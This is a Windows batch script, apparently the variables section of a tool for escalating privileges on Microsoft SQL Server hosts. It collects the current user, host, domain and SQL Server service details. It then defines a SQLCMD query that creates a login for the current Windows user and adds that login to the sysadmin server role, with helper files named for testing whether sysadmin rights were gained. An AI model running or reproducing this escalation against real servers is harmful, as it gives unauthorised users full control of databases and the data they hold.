@ECHO OFF
::variables source
::main vars
fc "user.txt" "blank.txt" > nul && ( FOR /F "tokens=* USEBACKQ" %%F IN (`whoami`) DO ( SET who=%%F ) ) || ( set /p who=<user.txt )
set who=%who: =%
set host=%COMPUTERNAME%
set domain=%USERDOMAIN%
set sc=fullscript.txt
set scb=fullscript.bat
set tst=test-if-iam-sysadmin.bat
set sfound="mssql_founded.txt"
set scmd=SQLCMD.exe
set query=CREATE LOGIN [%who%] from windows; exec sp_addsrvrolemember '%who%', 'sysadmin';
set regp=HKLM\SYSTEM\CurrentControlSet\Services\SQLWriter
set writer=C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe
set ssmsvr=0
::others
set _major=0
set many=0
cluster group 2>nul && set _cluerr=0 || set _cluerr=1
sc query |findstr .SQLB. >nul && Echo.SQLBrowser is running. && set _browser=1 || Echo.SQLBrowser is disabled. && set _browser=0
::files creation
echo. > %sfound%
type NUL > blank.txt